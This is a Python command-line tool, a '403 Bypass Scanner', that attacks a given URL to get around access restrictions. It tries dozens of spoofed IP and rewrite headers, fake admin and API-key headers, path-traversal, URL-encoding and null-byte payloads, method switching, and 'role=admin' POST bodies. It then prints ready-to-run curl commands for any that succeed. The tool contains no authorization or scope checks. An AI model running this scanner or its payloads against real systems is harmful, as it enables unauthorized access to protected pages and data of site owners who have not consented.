#!/usr/bin/env python3
import argparse
import requests
import sys
from urllib.parse import urlparse
from colorama import init, Fore, Style
import json
from datetime import datetime
import os
import hashlib

init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    CYAN = Fore.CYAN
    RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT

class JSONManager:
    def __init__(self):
        self.current_file = "current_scan.json"
        self.history_file = "scan_history.json"
        self.current_data = {
            "scan_time": datetime.now().isoformat(),
            "target": "",
            "option": "",
            "total_bypasses": 0,
            "bypasses": []
        }
        self.load_history()
    
    def load_history(self):
        if os.path.exists(self.history_file):
            try:
                with open(self.history_file, 'r') as f:
                    self.history_data = json.load(f)
            except:
                self.history_data = {"scans": []}
        else:
            self.history_data = {"scans": []}
    
    def save_current(self, target, option, bypasses):
        self.current_data["target"] = target
        self.current_data["option"] = option
        self.current_data["total_bypasses"] = len(bypasses)
        self.current_data["bypasses"] = bypasses
        self.current_data["scan_time"] = datetime.now().isoformat()
        
        with open(self.current_file, 'w') as f:
            json.dump(self.current_data, f, indent=2)
        
        # Also save to history
        scan_copy = self.current_data.copy()
        scan_copy["timestamp"] = datetime.now().timestamp()
        self.history_data["scans"].append(scan_copy)
        
        # Keep last 100 scans in history
        if len(self.history_data["scans"]) > 100:
            self.history_data["scans"] = self.history_data["scans"][-100:]
        
        with open(self.history_file, 'w') as f:
            json.dump(self.history_data, f, indent=2)
        
        return self.current_file, self.history_file
    
    def get_last_scan(self):
        if self.history_data["scans"]:
            return self.history_data["scans"][-1]
        return None

class WorkingPayloads:
    def __init__(self, json_manager):
        self.success = []
        self.commands = []
        self.json_manager = json_manager
        
    def add(self, tech, payload, status, url, headers=None, method='GET', data=None):
        if headers is None:
            headers = {}
        if 200 <= status < 400:
            entry = {
                'technique': tech,
                'payload': payload,
                'status_code': status,
                'url': url,
                'method': method,
                'headers': headers,
                'data': data,
                'timestamp': datetime.now().isoformat(),
                'id': hashlib.md5(f"{url}{tech}{payload}".encode()).hexdigest()[:8]
            }
            self.success.append(entry)
            
            cmd_parts = ['curl', '-k', '-s']
            if method.upper() != 'GET':
                cmd_parts.append(f'-X {method}')
            for h, v in headers.items():
                if h.lower() not in ['user-agent']:
                    cmd_parts.append(f'-H "{h}: {v}"')
            if data:
                cmd_parts.append(f'-d "{data}"')
            cmd_parts.append(f'"{url}"')
            
            self.commands.append({
                'command': ' '.join(cmd_parts),
                'status_code': status,
                'technique': tech,
                'id': entry['id']
            })
    
    def show(self, target, option):
        if not self.success:
            print(f"\n{Colors.RED}[!] Nothing worked{Colors.RESET}")
            current_file, history_file = self.json_manager.save_current(target, option, [])
            print(f"{Colors.YELLOW}[!] Empty scan saved to {current_file}{Colors.RESET}")
            return
        
        print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
        print(f"{Colors.GREEN}[✓] Found {len(self.success)} working bypasses{Colors.RESET}")
        print(f"{Colors.GREEN}{'='*60}{Colors.RESET}\n")
        
        for i, p in enumerate(self.success, 1):
            if p['status_code'] < 300:
                sc = Colors.GREEN
            else:
                sc = Colors.YELLOW
            print(f"{Colors.BOLD}[{i}] {sc}{p['status_code']}{Colors.RESET} - {Colors.CYAN}{p['technique']}{Colors.RESET} (ID: {p['id']})")
            print(f"    URL: {p['url']}")
            if p['headers']:
                print(f"    Headers:")
                for h, v in p['headers'].items():
                    print(f"      {h}: {v}")
            if p['data']:
                print(f"    Data: {p['data']}")
            print()
        
        print(f"\n{Colors.GREEN}Working curl commands:{Colors.RESET}\n")
        for i, cmd in enumerate(self.commands, 1):
            if cmd['status_code'] < 300:
                sc = Colors.GREEN
            else:
                sc = Colors.YELLOW
            print(f"{Colors.BOLD}[{i}] {sc}{cmd['status_code']}{Colors.RESET} - {Colors.CYAN}{cmd['technique']}{Colors.RESET}")
            print(f"{Colors.GREEN}{cmd['command']}{Colors.RESET}\n")
        
        current_file, history_file = self.json_manager.save_current(target, option, self.success)
        
        print(f"{Colors.CYAN}JSON Output:{Colors.RESET}")
        print(f"  Current scan: {current_file} (overwrites each scan)")
        print(f"  History file: {history_file} (appends all scans)")
        
        last = self.json_manager.get_last_scan()
        if last and len(self.json_manager.history_data["scans"]) > 1:
            print(f"\n{Colors.YELLOW}Previous scan: {last['scan_time']} - {last['total_bypasses']} bypasses{Colors.RESET}")
        
        save_extra = input(f"\n{Colors.YELLOW}Save additional formats? (csv/txt/both/n): {Colors.RESET}").lower()
        
        if save_extra in ['csv', 'both']:
            csv_file = f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
            with open(csv_file, 'w') as f:
                f.write("ID,Technique,Status,URL,Method,Payload\n")
                for p in self.success:
                    f.write(f"{p['id']},{p['technique']},{p['status_code']},{p['url']},{p['method']},{p['payload']}\n")
            print(f"{Colors.GREEN}[✓] Saved CSV: {csv_file}{Colors.RESET}")
        
        if save_extra in ['txt', 'both']:
            txt_file = f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(txt_file, 'w') as f:
                f.write(f"SCAN RESULTS - {datetime.now()}\n")
                f.write(f"Target: {target}\n")
                f.write(f"Option: {option}\n")
                f.write(f"Total Bypasses: {len(self.success)}\n")
                f.write("="*60 + "\n\n")
                for p in self.success:
                    f.write(f"[{p['status_code']}] {p['technique']}\n")
                    f.write(f"URL: {p['url']}\n")
                    f.write(f"Payload: {p['payload']}\n")
                    if p['headers']:
                        f.write(f"Headers: {json.dumps(p['headers'])}\n")
                    f.write("-"*40 + "\n")
            print(f"{Colors.GREEN}[✓] Saved TXT: {txt_file}{Colors.RESET}")

class Headers:
    @staticmethod
    def run(url, session, wp, verbose):
        if verbose:
            print(f"\n{Colors.BLUE}{'='*50}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] Header Bypass{Colors.RESET}")
            print(f"{Colors.BLUE}{'='*50}{Colors.RESET}")
        
        all_headers = [
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Forwarded", "127.0.0.1"),
            ("X-Forwarded-Host", "127.0.0.1"),
            ("X-Forwarded-Server", "127.0.0.1"),
            ("X-Remote-IP", "127.0.0.1"),
            ("X-Remote-Addr", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Client-IP", "127.0.0.1"),
            ("X-Host", "127.0.0.1"),
            ("X-Originating-IP", "127.0.0.1"),
            ("X-Original-IP", "127.0.0.1"),
            ("True-Client-IP", "127.0.0.1"),
            ("CF-Connecting-IP", "127.0.0.1"),
            ("X-Proxy-IP", "127.0.0.1"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
            ("X-Originating-Forwarded-For", "127.0.0.1"),
            ("X-Forward-For", "127.0.0.1"),
            ("X-Remote-For", "127.0.0.1"),
            ("X-Cluster-Client-IP", "127.0.0.1"),
            ("X-Original-Remote-Addr", "127.0.0.1"),
            ("X-Real-IP-Forwarded", "127.0.0.1"),
            ("X-Forwarded-By", "127.0.0.1"),
            ("X-Forwarded-For-Original", "127.0.0.1"),
            ("X-ProxyUser-Ip", "127.0.0.1"),
            ("X-Original-URL", "/"),
            ("X-Rewrite-URL", "/"),
            ("X-Original-Path", "/"),
            ("Referer", url),
            ("Origin", "https://google.com"),
            ("User-Agent", "Googlebot/2.1"),
            ("User-Agent", "Bingbot/2.0"),
            ("User-Agent", "curl/7.68.0"),
            ("X-Cache-Status", "BYPASS"),
            ("Cache-Control", "no-cache"),
            ("X-Admin", "true"),
            ("X-Debug", "true"),
            ("Authorization", "Bearer bypass"),
            ("X-API-Key", "bypass"),
            ("X-Forwarded-Port", "443"),
            ("X-Forwarded-Scheme", "http"),
            ("X-Forwarded-Proto", "http"),
            ("X-Forwarded-Protocol", "http"),
            ("X-HTTP-Method-Override", "GET"),
            ("X-Method-Override", "POST"),
            ("Accept-Language", "en-US,en;q=0.9"),
            ("X-CF-Forwarded-For", "127.0.0.1"),
            ("X-Azure-Forwarded-For", "127.0.0.1"),
            ("X-AWS-Forwarded-For", "127.0.0.1"),
            ("X-Sucuri-Client-IP", "127.0.0.1"),
            ("X-Fastly-Client-IP", "127.0.0.1"),
            ("X-Real-Host", "127.0.0.1"),
            ("X-Forwarded-Context", "admin"),
        ]
        
        for name, val in all_headers:
            headers = {'User-Agent': 'Mozilla/5.0'}
            test_url = url
            
            if name in ["X-Original-URL", "X-Rewrite-URL", "X-Original-Path"]:
                headers[name] = "/" + urlparse(url).path
                test_url = url + "/anything"
            else:
                headers[name] = str(val)
            
            try:
                r = session.get(test_url, headers=headers, timeout=8)
                s = r.status_code
                
                if 200 <= s < 400:
                    wp.add(f"Header - {name}", f"{name}: {val}", s, test_url, {name: str(val)})
                
                if verbose:
                    if s < 300:
                        c = Colors.GREEN
                    elif s < 400:
                        c = Colors.YELLOW
                    else:
                        c = Colors.RED
                    print(f"{c}[{s}] {name}{Colors.RESET}")
            except:
                if verbose:
                    print(f"{Colors.RED}[ERR] {name}{Colors.RESET}")

class Protocols:
    @staticmethod
    def run(url, session, wp, verbose):
        if verbose:
            print(f"\n{Colors.BLUE}{'='*50}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] Protocol Bypass{Colors.RESET}")
            print(f"{Colors.BLUE}{'='*50}{Colors.RESET}")
        
        parsed = urlparse(url)
        
        for proto in ['http', 'https']:
            if proto != parsed.scheme:
                test_url = url.replace(parsed.scheme, proto)
                try:
                    r = session.get(test_url, timeout=8)
                    s = r.status_code
                    
                    if 200 <= s < 400:
                        wp.add("Protocol Switch", f"{proto}", s, test_url)
                    
                    if verbose:
                        c = Colors.GREEN if s < 300 else Colors.YELLOW if s < 400 else Colors.RED
                        print(f"{c}[{s}] {proto}{Colors.RESET}")
                except:
                    if verbose:
                        print(f"{Colors.RED}[ERR] {proto}{Colors.RESET}")

class Ports:
    @staticmethod
    def run(url, session, wp, verbose):
        if verbose:
            print(f"\n{Colors.BLUE}{'='*50}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] Port Bypass{Colors.RESET}")
            print(f"{Colors.BLUE}{'='*50}{Colors.RESET}")
        
        ports = [80, 443, 8080, 8443, 4443, 3000, 5000, 8000, 8888, 9000]
        
        for port in ports:
            headers = {'X-Forwarded-Port': str(port)}
            try:
                r = session.get(url, headers=headers, timeout=8)
                s = r.status_code
                
                if 200 <= s < 400:
                    wp.add("Port Bypass", f"port {port}", s, url, headers)
                
                if verbose:
                    c = Colors.GREEN if s < 300 else Colors.YELLOW if s < 400 else Colors.RED
                    print(f"{c}[{s}] X-Forwarded-Port: {port}{Colors.RESET}")
            except:
                if verbose:
                    print(f"{Colors.RED}[ERR] Port {port}{Colors.RESET}")

class Methods:
    @staticmethod
    def run(url, session, wp, verbose):
        if verbose:
            print(f"\n{Colors.BLUE}{'='*50}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] HTTP Method Bypass{Colors.RESET}")
            print(f"{Colors.BLUE}{'='*50}{Colors.RESET}")
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']
        
        for method in methods:
            try:
                r = session.request(method, url, timeout=8)
                s = r.status_code
                
                if 200 <= s < 400:
                    wp.add("Method Bypass", method, s, url, method=method)
                
                if verbose:
                    if s < 300:
                        c = Colors.GREEN
                    elif s < 400:
                        c = Colors.YELLOW
                    else:
                        c = Colors.RED
                    print(f"{c}[{s}] {method}{Colors.RESET}")
            except:
                if verbose:
                    print(f"{Colors.RED}[ERR] {method}{Colors.RESET}")

class URLEncodes:
    @staticmethod
    def run(url, session, wp, verbose):
        if verbose:
            print(f"\n{Colors.BLUE}{'='*50}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] URL Encode Bypass{Colors.RESET}")
            print(f"{Colors.BLUE}{'='*50}{Colors.RESET}")
        
        payloads = [
            '#?', '%09', '%20', '%23%3f', '%2e%2e', '%2e%2e/', '%2f', '..', '../', '../../', 
            '/..', '/../', '/../../', '//', '/./', '//.', '///', '/%2e/', '/%2e%2e/', 
            '.;/', '/;', '..;/', '%2e%2e%2f', '%252e%252e%252f', '..%252f', '..%00/',
            '..%0d/', '%3f', '%23', '/%20#', '/%20%23', '/..;/', '.%2e/'
        ]
        
        for p in payloads:
            test_url = url + p
            try:
                r = session.get(test_url, timeout=8)
                s = r.status_code
                
                if 200 <= s < 400:
                    wp.add("URL Encode", p, s, test_url)
                
                if verbose:
                    if s < 300:
                        c = Colors.GREEN
                    elif s < 400:
                        c = Colors.YELLOW
                    else:
                        c = Colors.RED
                    print(f"{c}[{s}] {p}{Colors.RESET}")
            except:
                if verbose:
                    print(f"{Colors.RED}[ERR] {p}{Colors.RESET}")

class PathTraversal:
    @staticmethod
    def run(url, session, wp, verbose):
        if verbose:
            print(f"\n{Colors.BLUE}{'='*50}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] Path Traversal{Colors.RESET}")
            print(f"{Colors.BLUE}{'='*50}{Colors.RESET}")
        
        paths = [
            '../../../', '../../../../', '../../../../../', '../', './../',
            '....//', '../.../../', '..;/', '..\\/', '..%2f', '..%2f..%2f',
            '%2e%2e%2f', '%252e%252e%252f', '..%c0%af', '..%00/',
            '.;/', '.;/../', '..;/../', 'admin/../', 'admin/./../'
        ]
        
        for p in paths:
            test_url = url + '/' + p
            try:
                r = session.get(test_url, timeout=8)
                s = r.status_code
                
                if 200 <= s < 400:
                    wp.add("Path Traversal", p, s, test_url)
                
                if verbose:
                    if s < 300:
                        c = Colors.GREEN
                    elif s < 400:
                        c = Colors.YELLOW
                    else:
                        c = Colors.RED
                    print(f"{c}[{s}] {p[:30]}{Colors.RESET}")
            except:
                pass

class ExtensionBypass:
    @staticmethod
    def run(url, session, wp, verbose):
        if verbose:
            print(f"\n{Colors.BLUE}{'='*50}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] Extension Bypass{Colors.RESET}")
            print(f"{Colors.BLUE}{'='*50}{Colors.RESET}")
        
        extensions = ['.php', '.html', '.asp', '.aspx', '.jsp', '.bak', '.old', '.backup', '.sql', '.log']
        
        for ext in extensions:
            test_url = url + ext
            try:
                r = session.get(test_url, timeout=8)
                s = r.status_code
                
                if 200 <= s < 400:
                    wp.add("Extension", ext, s, test_url)
                
                if verbose:
                    if s < 300:
                        c = Colors.GREEN
                    elif s < 400:
                        c = Colors.YELLOW
                    else:
                        c = Colors.RED
                    print(f"{c}[{s}] {ext}{Colors.RESET}")
            except:
                pass

class DirectoryBypass:
    @staticmethod
    def run(url, session, wp, verbose):
        if verbose:
            print(f"\n{Colors.BLUE}{'='*50}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] Directory Bypass{Colors.RESET}")
            print(f"{Colors.BLUE}{'='*50}{Colors.RESET}")
        
        dirs = ['admin', 'backup', 'config', 'data', 'db', 'logs', 'private', 'secret', 'temp', 'test']
        
        for d in dirs:
            test_url = url + '/' + d
            try:
                r = session.get(test_url, timeout=8)
                s = r.status_code
                
                if 200 <= s < 400:
                    wp.add("Directory", d, s, test_url)
                
                if verbose:
                    if s < 300:
                        c = Colors.GREEN
                    elif s < 400:
                        c = Colors.YELLOW
                    else:
                        c = Colors.RED
                    print(f"{c}[{s}] /{d}{Colors.RESET}")
            except:
                pass

class CaseSensitive:
    @staticmethod
    def run(url, session, wp, verbose):
        if verbose:
            print(f"\n{Colors.BLUE}{'='*50}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] Case Sensitivity{Colors.RESET}")
            print(f"{Colors.BLUE}{'='*50}{Colors.RESET}")
        
        parsed = urlparse(url)
        path = parsed.path
        if not path or path == '/':
            return
        
        parts = path.split('/')
        tests = []
        
        for i, part in enumerate(parts):
            if part:
                tests.append('/'.join(parts[:i] + [part.upper()] + parts[i+1:]))
                tests.append('/'.join(parts[:i] + [part.lower()] + parts[i+1:]))
        
        for test in set(tests[:10]):
            test_url = f"{parsed.scheme}://{parsed.netloc}{test}"
            try:
                r = session.get(test_url, timeout=8)
                s = r.status_code
                
                if 200 <= s < 400 and s != 404:
                    wp.add("Case Sensitivity", test, s, test_url)
                
                if verbose and s != 404:
                    if s < 300:
                        c = Colors.GREEN
                    elif s < 400:
                        c = Colors.YELLOW
                    else:
                        c = Colors.RED
                    print(f"{c}[{s}] {test}{Colors.RESET}")
            except:
                pass

class PostData:
    @staticmethod
    def run(url, session, wp, verbose):
        if verbose:
            print(f"\n{Colors.BLUE}{'='*50}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] POST Data Bypass{Colors.RESET}")
            print(f"{Colors.BLUE}{'='*50}{Colors.RESET}")
        
        data_payloads = [
            ('{"admin":true}', 'application/json'),
            ('admin=true', 'application/x-www-form-urlencoded'),
            ('role=admin', 'application/x-www-form-urlencoded'),
            ('is_admin=1', 'application/x-www-form-urlencoded')
        ]
        
        for data, content_type in data_payloads:
            headers = {'Content-Type': content_type}
            try:
                r = session.post(url, data=data, headers=headers, timeout=8)
                s = r.status_code
                
                if 200 <= s < 400:
                    wp.add("POST Data", data[:30], s, url, headers, 'POST', data)
                
                if verbose:
                    if s < 300:
                        c = Colors.GREEN
                    elif s < 400:
                        c = Colors.YELLOW
                    else:
                        c = Colors.RED
                    print(f"{c}[{s}] {data[:20]}{Colors.RESET}")
            except:
                pass

class NullByte:
    @staticmethod
    def run(url, session, wp, verbose):
        if verbose:
            print(f"\n{Colors.BLUE}{'='*50}{Colors.RESET}")
            print(f"{Colors.CYAN}[+] Null Byte Bypass{Colors.RESET}")
            print(f"{Colors.BLUE}{'='*50}{Colors.RESET}")
        
        nulls = ['%00', '%2500', '..%00/', '..%00;', '%00.php']
        
        for n in nulls:
            test_url = url + n
            try:
                r = session.get(test_url, timeout=8)
                s = r.status_code
                
                if 200 <= s < 400:
                    wp.add("Null Byte", n, s, test_url)
                
                if verbose:
                    if s < 300:
                        c = Colors.GREEN
                    elif s < 400:
                        c = Colors.YELLOW
                    else:
                        c = Colors.RED
                    print(f"{c}[{s}] {n}{Colors.RESET}")
            except:
                pass

class Scanner:
    def __init__(self, target, option, verbose=False):
        self.target = target
        self.option = option
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.json_manager = JSONManager()
        self.wp = WorkingPayloads(self.json_manager)
        try:
            from requests.packages.urllib3.exceptions import InsecureRequestWarning
            requests.packages.urllib3.disable_warnings()
        except:
            pass
    
    def run(self):
        if self.verbose:
            print(f"\n{Colors.GREEN}{'💀'*10}{Colors.RESET}")
            print(f"{Colors.GREEN}💀{Colors.CYAN} 403 Bypass Scanner{Colors.GREEN}💀{Colors.RESET}")
            print(f"{Colors.GREEN}{'💀'*10}{Colors.RESET}")
            print(f"{Colors.CYAN}[*] Target: {self.target}{Colors.RESET}")
        
        try:
            r = self.session.get(self.target, timeout=8)
            if self.verbose:
                print(f"{Colors.YELLOW}[*] Original status: {r.status_code}{Colors.RESET}")
            if 200 <= r.status_code < 400:
                self.wp.add("Original", "direct access", r.status_code, self.target)
        except:
            if self.verbose:
                print(f"{Colors.RED}[!] Can't reach target{Colors.RESET}")
        
        if self.option in ['exploit', 'all', 'header']:
            Headers.run(self.target, self.session, self.wp, self.verbose)
        if self.option in ['exploit', 'all', 'protocol']:
            Protocols.run(self.target, self.session, self.wp, self.verbose)
        if self.option in ['exploit', 'all', 'port']:
            Ports.run(self.target, self.session, self.wp, self.verbose)
        if self.option in ['exploit', 'all', 'method']:
            Methods.run(self.target, self.session, self.wp, self.verbose)
        if self.option in ['exploit', 'all', 'encode']:
            URLEncodes.run(self.target, self.session, self.wp, self.verbose)
        if self.option in ['exploit', 'all']:
            PathTraversal.run(self.target, self.session, self.wp, self.verbose)
            ExtensionBypass.run(self.target, self.session, self.wp, self.verbose)
            DirectoryBypass.run(self.target, self.session, self.wp, self.verbose)
            CaseSensitive.run(self.target, self.session, self.wp, self.verbose)
            PostData.run(self.target, self.session, self.wp, self.verbose)
            NullByte.run(self.target, self.session, self.wp, self.verbose)
        
        self.wp.show(self.target, self.option)

def main():
    parser = argparse.ArgumentParser(description='403 Bypass Scanner with JSON output')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-o', '--option', required=True, 
                       choices=['exploit', 'header', 'protocol', 'port', 'method', 'encode', 'all'],
                       help='Bypass mode')
    parser.add_argument('-v', '--verbose', action='store_true', help='Show all attempts')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Colors.RED}[!] URL must start with http:// or https://{Colors.RESET}")
        sys.exit(1)
    
    s = Scanner(args.url, args.option, args.verbose)
    s.run()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Stopped{Colors.RESET}")
        sys.exit(0)
